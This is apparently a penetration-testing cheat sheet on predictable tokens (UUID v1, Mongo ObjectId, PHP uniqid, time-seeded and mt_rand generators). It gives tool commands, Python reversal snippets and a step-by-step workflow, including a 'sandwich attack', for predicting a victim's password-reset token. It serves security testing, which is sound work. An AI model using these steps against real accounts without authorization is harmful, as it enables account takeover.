# Predictable token catalogue — Open WHEN: you have one or more session IDs, password-reset / email-verification tokens, invite codes, or API keys and want to test whether they are guessable from their structure or from a known generation time.

The goal is always the same: recover the hidden state (a seed, a timestamp, a
counter) from one or two observed tokens, then regenerate the token a victim
will be issued, or one that was issued moments before/after yours. Collect at
least two consecutive tokens from your own account first — the delta between
them usually exposes the generator.

## Quick identification table

| Observed token shape | Likely generator | Why it is predictable |
|---|---|---|
| `550e8400-e29b-41d4-a716-446655440000` with `1` in the 3rd group's first nibble (`...-1xxx-...`) | UUID **v1** | Encodes a 60-bit timestamp + clock seq + the host MAC address. Fully reconstructable. |
| Same UUID but 3rd group starts with `4` (`...-4xxx-...`) | UUID **v4** (random) | Strong if from a CSPRNG. Note `3`=MD5-based, `5`=SHA1-based (derived, not random). |
| 24 hex chars, e.g. `5ae9b90a2c144b9def01ec37` | Mongo **ObjectId** | timestamp(4B)+machine(3B)+pid(2B)+counter(3B). Only the 3-byte counter and timestamp move between consecutive docs. |
| 13 hex chars, e.g. `6659cea087cd6` | PHP **uniqid()** | `sprintf("%8x%05x", sec, usec)` of the server clock. Reversible to a microsecond timestamp. |
| sha256/md5 of a 13-hex value | hashed **uniqid()** | Same as above but pre-image the 13-hex token (small search space around the request time), then hash. |
| Short numeric / `rand()`-looking value | PHP `rand()` / `mt_rand()` | mt_rand seed recoverable from 2 outputs (no brute force). |

## UUID v1 (time + MAC based)

If a reset link, invite, or object id is a v1 UUID, you can read its exact
creation time and the host MAC, and you can generate the UUIDs that would have
been issued in any time window. Tool: `intruder-io/guidtool`.

```ps1
# Inspect a single v1 UUID — reveals timestamp + MAC
guidtool -i 95f6e264-bb00-11ec-8833-00155d01ef00
# UUID version: 1 / UUID time: 2022-04-13 08:06:13 / MAC: 00:15:5d:01:ef:00

# Generate candidate UUIDs around a known issuance time (-t), -p = precision/count
guidtool 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c -t '2021-11-17 18:03:17' -p 10000
```

Use case: request a reset for your own account, note the v1 UUID and the HTTP
`Date` header; trigger a reset for the victim; generate the small band of UUIDs
around that second and try each.

## Mongo ObjectId (predict neighbours)

Consecutive ObjectIds differ only in the trailing counter and the leading
timestamp; machine and pid bytes are constant per server process. Given one
ObjectId you can enumerate the documents created just before/after it — a
common IDOR-via-predictable-id path. Tool: `andresriancho/mongo-objectid-predict`.

```ps1
./mongo-objectid-predict 5ae9b90a2c144b9def01ec37
# 5ae9bac82c144b9def01ec39
# 5ae9bacf2c144b9def01ec3a
```

Reverse an ObjectId into its parts in pure Python (no tool needed):

```py
def reverse_objectid(token):
    return (int(token[0:8],16),   # timestamp (unix seconds)
            int(token[8:18],16),  # machine + pid
            int(token[18:24],16)) # counter
# e.g. reverse_objectid("5ae9b90a2c144b9def01ec37")
```

## PHP uniqid() (reverse to a timestamp)

`uniqid()` is `sprintf("%8x%05x", seconds, microseconds)` of the server clock —
no entropy at all unless the `more_entropy` flag is set (and even then the
suffix is weak). Reverse it to the exact microsecond it was generated:

```py
def reverse_uniqid(value):          # value is the 13-hex token
    sec  = int(value[:8], 16)
    usec = int(value[8:], 16)
    return float(f"{sec}.{usec}")   # unix time with microseconds
```

If the token is `sha256(uniqid())` or `md5(uniqid())`, you cannot reverse the
hash directly, but you can regenerate every uniqid for the microseconds around
the observed request time, hash each, and match — a tiny search space.

## Time-based seeds (rand/mt_rand seeded from time)

Many home-grown generators do `srand(time()); $token = rand();` or
`mt_srand(time())`. If you know roughly when the token was created (the HTTP
`Date` header), the seed space is only a few seconds wide. Regenerate by
seeding the same PRNG with each candidate second:

```python
import random, time
seed = int(time.mktime(time.strptime('2024-11-10 13:37', '%Y-%m-%d %H:%M')))
random.seed(seed)
print(random.randint(1, 100))   # reproduce the server's "random" value
```

### Breaking PHP mt_rand() from two outputs (no brute force)

If you can extract two raw `mt_rand()` outputs (e.g. two tokens or two values
in one response), the Mersenne-Twister seed is fully recoverable, after which
every future output is known. Tool: `ambionics/mt_rand-reverse`.

```ps1
./reverse_mt_rand.py 712530069 674417379 123 1   # two outputs -> seed
```

## Custom / home-grown formulas (commonly seen, all weak)

These appear in real codebases and are trivially predictable once you know the
inputs (email, request time):

* `$token = md5($emailId) . rand(10,9999);`  — md5(email) is deterministic; only 4 digits of `rand` to guess.
* `$token = md5(time() + 123456789 % rand(4000, 55000000));` — time-anchored, narrow space.

## Sandwich attack (defeating microsecond-precision time tokens)

When a reset token is a high-resolution timestamp (e.g. `uniqid()` to the
microsecond) you usually cannot guess the exact value. The **sandwich attack**
brackets it: send a request that issues a token to **your** account, then
immediately trigger the **victim's** reset, then issue **another** token to
yourself. The victim's token was generated at a time strictly *between* your
two tokens, so you only have to enumerate the microseconds in that narrow
window. Tool: `AethliosIK/reset-tolkien` automates both detection and the
sandwich.

```ps1
# Detect the underlying time format of a captured token
reset-tolkien detect 660430516ffcf -d "Wed, 27 Mar 2024 14:42:25 GMT" \
  --prefixes "victim@example.com" --suffixes "victim@example.com" --timezone "-7"

# Run the sandwich between two bracketing timestamps you captured
reset-tolkien sandwich 660430516ffcf -bt 1711550546.485597 -et 1711550546.505134 \
  -o output.txt --token-format="uniqid"
```

A multi-sandwich variant works against MongoDB ObjectId-based invite/reset flows
for real-time monitoring of newly issued tokens.

## Black-box workflow

1. Collect ≥2 consecutive tokens from your own account; record each response's
   `Date` header.
2. Classify the token with the table above (length, charset, hyphen pattern,
   leading bytes).
3. Reverse one token to its hidden state (timestamp / counter / seed).
4. Predict the victim's token: either neighbours of yours (ObjectId, counter)
   or the value issued at the victim's known request time (uniqid, UUIDv1,
   time-seeded rand) — use the sandwich window when precision is too high.
5. Report the generator, the recovered state, and a regenerated token as
   evidence.
